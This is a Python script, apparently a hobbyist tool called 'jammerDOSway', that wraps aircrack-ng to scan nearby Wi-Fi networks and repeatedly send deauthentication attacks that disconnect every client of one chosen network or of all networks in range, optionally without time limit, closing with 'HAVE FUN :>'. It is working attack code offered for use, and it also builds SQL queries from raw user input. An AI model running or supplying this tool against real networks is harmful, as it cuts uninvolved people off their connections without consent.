import subprocess
import os
import time
import sqlite3

text = """                     ▄▀░░▌
                   ▄▀▐░░░▌
                ▄▀▀▒▐▒░░░▌
     ▄▀▀▄   ▄▄▀▀▒▒▒▒▌▒▒░░▌
    ▐▒░░░▀▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒█
    ▌▒░░░░▒▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
   ▐▒░░░░░▒▒▒▒▒▒▒▒▒▌▒▐▒▒▒▒▒▀▄
    ▌▀▄░░▒▒▒▒▒▒▒▒▐▒▒▒▌▒▌▒▄▄▒▒▐
   ▌▌▒▒▀▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒█▄█▌▒▒▌
 ▄▀▒▐▒▒▒▒▒▒▒▒▒▒▒▄▀█▌▒▒▒▒▒▀▀▒▒▐░░░▄
▀▒▒▒▒▌▒▒▒▒▒▒▒▄▒▐███▌▄▒▒▒▒▒▒▒▄▀▀▀▀
▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDOSway ۩۞۩░▒▓█▇▅▃▂"""
print(text)
CRED = '\033[41m'
CEND = '\033[0m'
print("\nHi jumppy :>")
all_or_one = input(CRED + "\nChoose target" + CEND +"\n(all=y, one=n): ")
if all_or_one == 'n':
    wifi_name = input(CRED + "\nGive the name of the WIFI exactly:" + CEND + " ")
during = input(CRED + "\nFor how many seconds do you want to drop the devices?" + CEND + "\n(0=unlimited): ")


def getInterfaceName():
    process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
    interface_name = process_of_interface_output.split("\n")[0]  # Searching for interface name
    interface_name = interface_name[11:]  # Getting the name only

    return interface_name

def changeMod(interface_name):
    os.system("airmon-ng start " + interface_name)

def isMonitor():
    process_of_type_output = subprocess.getoutput("iw dev | grep type")
    type_of_card = process_of_type_output.split("\n")[0]
    type_of_card = type_of_card[7:]
    print(type_of_card)
    if type_of_card == 'monitor':
        return True
    if type_of_card == 'managed':
        print("\nYou may want change your type of network card manually.")
        return False

def scanNetwork(interface_name_monitor):
    print("Scanning...")
    files_first = os.listdir("./firstScan")
    number_of_files_first = len(files_first)
    os.system(f"timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")

def scanAllnetwork(interface_name_monitor):
    print("Scanning...")
    files_allf = os.listdir("./allScan/allfScan")
    number_of_files_allf = len(files_allf)
    os.system(f"timeout -s 9 10 airodump-ng -w ./allScan/allfScan/output_of_scan{number_of_files_allf} --output-format kismet.csv {interface_name_monitor}")

def getTargets(db_name):

    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    macs = f"""SELECT BSSID FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    channels = f"SELECT Channel FROM dump"
    c.execute(channels)
    channels = c.fetchall()

    return macs, channels

def getData(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{wifi_name}'"""
    c.execute(bssid)
    bssid = c.fetchone()[0]

    channel = f"""SELECT channel FROM dump WHERE ESSID ='{wifi_name}'"""
    c.execute(channel)
    channel = c.fetchone()[0]

    return bssid, channel

def scanDevices(interface_name_monitor, bssid, channel):
    print("Scanning...")
    channel = str(channel)
    files_second = os.listdir("./secondScan")
    number_of_files_second = len(files_second)
    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")

def scanDevicesforAll(interface_name_monitor, bssid, channel):
    print("Scanning...")
    channel = str(channel)
    files_alls = os.listdir("./allScan/allsScan")
    number_of_files_alls = len(files_alls)
    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")

def getWIFIname(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    names = f"""SELECT ESSID FROM dump"""
    c.execute(names)
    names = c.fetchall()
    return names


def getMACs(db_name):

    conn = sqlite3.connect(db_name)
    c = conn.cursor()

    macs = f"""SELECT StationMAC FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    return macs


def drop(device_mac, network_mac, interface_name_monitor):
    print(device_mac)
    os.system(f"gnome-terminal -- aireplay-ng -0 {during} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")

def clean():
    os.system("rm -rf firstScan/o*")
    os.system("rm -rf secondScan/o*")
    os.system("rm -rf allScan/allfScan/o*")
    os.system("rm -rf allScan/allsScan/o*")


clean()
interface_name = getInterfaceName()
print(interface_name)


changeMod(interface_name)

if isMonitor():
    print("The mode has changed to monitor instead of managed.")
    interface_name_monitor = interface_name

    if all_or_one == 'y':
        # ALL SCAN
        scanAllnetwork(interface_name_monitor)
        files_allf = os.listdir("./allScan/allfScan")
        number_of_files_allf = len(files_allf)
        os.system(f"./kismet2sqlite.sh ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")

        db_name = f"./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv.db"
        targets, channels = getTargets(db_name)
        names = getWIFIname(db_name)


        for i in range(0, len(targets)):

            name = str(names[i])
            name = name[2:-3]
            print(CRED+ name + CEND)
            bssid = str(targets[i])
            bssid = bssid[2:19]
            print(bssid)
            channel = str(channels[i])
            channel = channel[1:-2]
            print(channel)

            scanDevicesforAll(interface_name_monitor, bssid, channel)
            files_alls = os.listdir("./allScan/allsScan")
            number_of_files_alls = len(files_alls)
            os.system(f"./kismet3sqlite.sh ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")
            print("Creating db...")
            time.sleep(3)
            os.system(f"rm -r ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")

            db_name = f"./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv.db"
            macs = getMACs(db_name)
            print(macs)
            counter = 0
            for mac in macs:
                mac = str(mac)
                mac = mac[2:19]
                print(CRED + mac + CEND)
                if len(mac) == 17:
                    drop(mac, bssid, interface_name_monitor)
                    time.sleep(5)
                    counter += 1
                if len(macs) == 1:
                    print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                    time.sleep(1)
        if counter == len(macs):
            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")

    elif all_or_one == 'n':
        ## FIRST SCAN
        scanNetwork(interface_name_monitor)
        files_first = os.listdir("./firstScan")
        number_of_files_first = len(files_first)
        os.system(f"./kismet2sqlite.sh ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")

        db_name = f"./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv.db"
        bssid, channel = getData(db_name)
        print(bssid, channel)

        # SECOND SCAN
        scanDevices(interface_name_monitor, bssid, channel)
        files_second = os.listdir("./secondScan")
        number_of_files_second = len(files_second)
        os.system(f"./kismet3sqlite.sh ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
        print("Creating db...")
        time.sleep(3)
        os.system(f"rm -r ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")

        db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
        macs = getMACs(db_name)
        print(macs)
        counter = 0
        for mac in macs:
            mac = str(mac)
            mac = mac[2:19]
            print(CRED + mac + CEND)
            if len(mac) == 17:
                drop(mac, bssid, interface_name_monitor)
                time.sleep(5)
                counter += 1
            if len(macs) == 1:
                print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                time.sleep(1)
        if counter == len(macs):
            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")

else:
    print("The mode has NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)

